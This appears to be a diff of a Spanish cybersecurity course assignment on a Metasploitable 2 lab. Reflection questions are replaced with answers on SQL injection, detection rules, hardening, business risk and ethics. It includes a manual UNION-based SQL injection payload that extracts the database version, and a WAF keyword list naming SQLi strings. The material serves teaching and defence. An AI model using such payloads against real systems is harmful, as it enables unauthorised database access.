+  - Dividir roles (uno analiza entorno interno y documentación, otro ejecuta escalada y extracción) es más efectivo que trabajar simultáneamente en la misma shell, porque reduce colisiones y mejora cobertura.
 
-b\) Si obtuvieron acceso directo como root (por ejemplo, vía vsftpd o
-Samba), ¿qué riesgos adicionales representa esto para una organización?
+### 6. SQL Injection — más allá de la explotación básica
 
-c\) **Investigación:** Busquen información sobre el CVE-2009-1185 (udev
-privilege escalation) que afecta a Metasploitable 2. ¿Cómo funciona?
-¿Por qué es relevante incluso hoy?
+- **6.a Diferencias entre In-band, Blind y Out-of-band:**
+  - **In-band:** los resultados de la inyección se muestran en la misma respuesta HTTP (ej. UNION, error-based). Rápido y directo.
+  - **Blind:** la aplicación no devuelve resultados; se deduce por True/False o tiempos (boolean/time-based). Más lento.
+  - **Out-of-band:** la DB realiza solicitudes a un canal externo (DNS/HTTP) para exfiltrar datos cuando otros canales no funcionan.
+  - **Tipo en Metasploitable 2:** típicamente **in-band** (DVWA/Mutillidae ofrecen ejemplos in-band fáciles).
 
-d\) **Persistencia:** Aunque no fue requerido en la práctica, ¿qué
-técnicas usarían para mantener acceso persistente en Metasploitable 2?
-Mencionen al menos 2 métodos.
+- **6.b Payload manual para extraer la versión de la BD (ejemplo):**
 
-e\) **Colaboración:** Durante la post-explotación, ¿trabajaron
-simultáneamente en el mismo sistema o dividieron tareas? ¿Cuál enfoque
-fue más efectivo?
+```sql
+id=1' UNION SELECT NULL, @@version-- -
+```
 
-**6. SQL Injection: Más Allá de la Explotación Básica**
+Nota: ajustar el número y tipo de columnas según la consulta objetivo.
 
-Si explotaron SQL Injection en DVWA o Mutillidae:
+- **6.c Técnicas de codificación segura:**
+  - Prepared statements / consultas parametrizadas.
+  - Validación y saneamiento de entrada (whitelist).
+  - Uso de ORM y cuentas de DB con permisos mínimos.
 
-a\) Expliquen la diferencia entre SQL Injection \"in-band\", \"blind\" y
-\"out-of-band\". ¿Cuál tipo encontraron en Metasploitable 2?
+- **6.d Análisis de impacto adicional de SQLi:**
+  - Escritura de archivos (`INTO OUTFILE`), ejecución de comandos OS (si la BD lo permite), creación/modificación de usuarios administrativos y sabotaje de datos.
 
-b\) SQLMap automatiza el proceso, pero ¿podrían escribir manualmente un
-payload de SQL Injection que extraiga la versión de la base de datos?
-(Escriban el payload)
+- **6.e Roles complementarios durante SQLi:**
+  - Uno automatiza con `sqlmap` y captura dumps; el otro construye payloads manuales, revisa tablas y correlaciona hallazgos para escalar lateralmente.
 
-c\) **Defensa:** ¿Qué técnicas de codificación segura previenen SQL
-Injection? Mencionen al menos 3 (prepared statements, ORM, validación de
-entrada, etc.)
+---
 
-d\) **Análisis de impacto:** Además de robar datos, ¿qué otros ataques
-son posibles mediante SQL Injection? (Pista: escritura de archivos,
-ejecución de comandos OS, etc.)
+## Bloque 3 — Perspectiva defensiva, negocio y ética
 
-e\) **Roles complementarios:** ¿Uno de ustedes ejecutó SQLMap mientras
-el otro analizaba resultados? ¿Cómo coordinaron esta fase?
+### 7. Del Red Team al Blue Team
 
-**BLOQUE 3: PERSPECTIVA DEFENSIVA Y ESTRATÉGICA (Preguntas 7-10)**
+- **7.a Reglas y alertas concretas para detectar los ataques realizados:**
+  - Regla Suricata/Snort para detectar patrones de usernames anómalos en FTP y firmas de `vsftpd` backdoor.
+  - Alertas de múltiples fallos SSH (threshold) integradas con `fail2ban` y SIEM.
+  - Reglas WAF para `UNION`, `@@`, `INTO OUTFILE` y cadenas típicas de SQLi.
+  - Correlación: procesos que abren listeners tras conexiones FTP/web → alerta de posible backdoor.
 
-**7. Del Red Team al Blue Team**
+- **7.b Plan de hardening (5 pasos prioritarios):**
+  1. Deshabilitar servicios innecesarios (FTP, Telnet) y migrar a protocolos seguros (SFTP/FTPS).
+  2. Patching regular y gestión de vulnerabilidades.
+  3. Segmentar red (DMZ) y aplicar ACLs para servicios públicos.
+  4. Habilitar logging centralizado y monitorización (SIEM, EDR).
+  5. Forzar MFA y revisar `sudoers`/principio de menor privilegio.
 
-Cambien su perspectiva de atacantes a defensores:
+- **7.c Archivos de log a revisar:**
+  - `/var/log/auth.log` (ssh/sudo/auth)
+  - `/var/log/syslog` (eventos sistema)
+  - `/var/log/apache2/access.log` y `error.log` (actividad web)
+  - Logs de FTP (p. ej. `/var/log/vsftpd.log`) y logs de MySQL (`/var/log/mysql/*`).
 
-a\) **Detección:** Si fueran los administradores de sistemas de
-TechVault Industries, ¿qué alertas o reglas de detección implementarían
-para identificar los ataques que realizaron? Sean específicos (mencionen
-herramientas como Snort, Suricata, SIEM, etc.)
+- **7.d Estrategias defensivas en ejercicio rol:**
+  - Como Blue: implementar WAF, EDR/XDR y segmentación; establecer reglas de detección adaptativas. Como Red (para pruebas): usar técnicas de bajo ruido y validar detecciones.
 
-b\) **Hardening:** Proporcionen un plan de hardening de 5 pasos para
-asegurar Metasploitable 2, priorizando por impacto.
+### 8. Análisis de riesgo empresarial
 
-c\) **Monitoreo:** ¿Qué archivos de log deberían revisar para encontrar
-evidencia de su ataque? Listen al menos 4 archivos específicos de Linux.
+- **8.a Impacto financiero (resumen):**
+  - Brecha que exponga datos de clientes puede implicar multas regulatorias (GDPR), pérdida reputacional, costes de mitigación y potencial litigio: coste potencial desde decenas de miles hasta millones según escala.
 
-d\) **Ejercicio de rol:** Imaginen que uno de ustedes es Red Team y el
-otro Blue Team. ¿Qué estrategias defensivas propondrían contra las
-técnicas que usaron?
+- **8.b Comunicación ejecutiva (3-4 líneas):**
+  - "Hemos identificado servicios y versiones obsoletas con vulnerabilidades explotables que permiten acceso remoto y posible exfiltración de datos. Recomendamos intervención inmediata para parches, segmentación y control de accesos: estas medidas reducen el riesgo de sanciones y daño reputacional."
 
-**8. Análisis de Riesgo Empresarial**
+- **8.c Priorización de remediación (Top 3):**
+  1. Mitigar/eliminar `vsftpd` con backdoor o bloquear puerto 21 desde Internet.
+  2. Asegurar `phpMyAdmin` y WebDAV (autenticación restringida y accesos por IP).
+  3. Actualizar y endurecer Samba/NFS y aplicar controles de acceso.
 
-Adopten la perspectiva de un equipo de CISOs (Chief Information Security
-Officers):
+- **8.d Consenso de equipo:**
+  - Prioridades se decidieron combinando impacto y facilidad de mitigación (matriz Impacto×Esfuerzo).
 
-a\) **Impacto financiero:** Si Metasploitable 2 fuera un servidor real
-de producción con datos de clientes, ¿cuál sería el impacto potencial de
-este compromiso? Consideren: multas GDPR, pérdida de reputación, costos
-de remediación, etc.
+### 9. Contexto real vs laboratorio
 
-b\) **Comunicación ejecutiva:** Redacten un párrafo (3-4 líneas)
-explicando el riesgo de estas vulnerabilidades a un CEO sin
-conocimientos técnicos.
+- **9.a Realismo:**
+  - Es poco frecuente en infra bien gestionada, pero común en sistemas legacy, dispositivos olvidados o instancias públicas mal configuradas.
 
-c\) **Priorización de remediación:** Con presupuesto limitado, ¿qué 3
-vulnerabilidades remediarían primero y por qué?
+- **9.b Caso real (comparación breve):**
+  - Equifax 2017 explotó RCE por falta de parche (Apache Struts). Similitud: vulnerabilidad conocida sin parche; diferencia: escala y vectores usados.
 
-d\) **Consenso de equipo:** ¿Tuvieron diferentes opiniones sobre la
-priorización de riesgos? ¿Cómo llegaron a un acuerdo?
+- **9.c Evolución de amenazas (2024-2025):**
+  - Amenazas frecuentes: ataques a la cadena de suministro, configuraciones inseguras en cloud y abuso de permisos administrativos; incremento de Ransomware-as-a-Service.
 
-**9. Contexto Real vs. Laboratorio**
+- **9.d Defensa moderna que dificultaría el ataque:**
+  - EDR/XDR, Zero Trust, WAF + RASP, micro-segmentación y gestión central de secretos.
 
-Metasploitable 2 es intencionalmente vulnerable para propósitos
-educativos:
+- **9.e División de investigación:**
+  - Repartir casos reales permitió comparar lecciones y ver que la raíz común suele ser falta de gobernanza y parcheo.
 
-a\) **Realismo:** ¿Qué tan probable es encontrar un servidor con tantas
-vulnerabilidades críticas en una organización moderna? Justifiquen su
-respuesta.
+### 10. Ética, responsabilidad profesional y dinámica de equipo
 
-b\) **Investigación:** Busquen un caso real de ataque (por ejemplo:
-Equifax 2017, SolarWinds 2020, Colonial Pipeline 2021). ¿Qué similitudes
-y diferencias encuentran con su ataque a Metasploitable 2?
+- **10.a Línea ética (ejemplos):**
+  - Hacking ético: pruebas con autorización y reporte responsable de fallos. Ejemplo: pentest contratado y documentado.
+  - Actividad maliciosa: explotar vulnerabilidades sin permiso para extraer datos.
 
-c\) **Evolución de amenazas:** Las vulnerabilidades de Metasploitable 2
-son de 2008-2012. ¿Qué tipos de vulnerabilidades son más comunes en
-2024-2025? (Investiguen: supply chain attacks, cloud misconfigurations,
-zero-days, etc.)
+- **10.b Dilema ético (evidencia criminal encontrada):**
+  - Detener pruebas, preservar evidencia y notificar al cliente/punto legal según políticas del engagement.
 
-d\) **Defensa moderna:** ¿Qué tecnologías de seguridad modernas habrían
-dificultado o impedido su ataque? (Mencionen: EDR, XDR, Zero Trust,
-micro-segmentación, etc.)
+- **10.c Responsabilidad de divulgación:**
+  - Seguir responsible disclosure: notificar vendor, coordinar parche y divulgación pública con mitigaciones.
 
-e\) **División de investigación:** ¿Cada uno investigó un caso de ataque
-real diferente? ¿Qué aprendieron al comparar sus hallazgos?
+- **10.d Desarrollo profesional:**
+  - Seguir códigos y certificaciones (EC-Council, (ISC)², OSCP) y operar siempre con autorización escrita.
 
-**\
-**
+- **10.e Si un miembro propone uso no ético:**
+  - Parar, documentar y escalar a la dirección; negarse a participar en actividades no autorizadas.
 
-**10. Ética, Responsabilidad Profesional y Dinámica de Equipo**
+- **10.f Fortalezas complementarias del equipo:**
+  - Uno fuerte en enumeración y exploits públicos; otro en análisis web, scripting y post-explotación — combinación efectiva.
 
-Reflexionen sobre las implicaciones éticas de las habilidades que han
-desarrollado:
-
-a\) **Línea ética:** ¿Dónde trazan la línea entre hacking ético y
-actividad maliciosa? Proporcionen un ejemplo concreto de cada lado de la
-línea.
-
-b\) **Dilema ético:** Imaginen que durante un engagement autorizado de
-Red Team descubren evidencia de actividad criminal (no relacionada con
-su prueba) en los sistemas del cliente. ¿Qué harían? Justifiquen su
-respuesta.
-
-c\) **Responsabilidad de divulgación:** Si descubrieran una
-vulnerabilidad 0-day durante esta práctica (hipotéticamente), ¿cuál
-sería el proceso responsable de divulgación? Investiguen sobre
-\"responsible disclosure\" vs \"full disclosure\".
-
-d\) **Desarrollo profesional:** ¿Cómo se asegurarán de usar estas
-habilidades de manera ética en su carrera profesional? ¿Qué
-certificaciones o códigos de conducta seguirían? (Investiguen:
-EC-Council Code of Ethics, (ISC)² Code of Ethics, SANS Ethics, etc.)
-
-e\) **Ética de equipo:** ¿Qué harían si uno de ustedes quisiera usar
-estas técnicas de manera no ética? ¿Cómo se responsabilizarían
-mutuamente?
-
-f\) **Fortalezas complementarias:** ¿Qué fortalezas únicas aportó cada
-miembro del equipo? ¿Cómo se complementaron sus habilidades?
+---
 
 **CRITERIOS DE EVALUACIÓN DE REFLEXIONES**
 
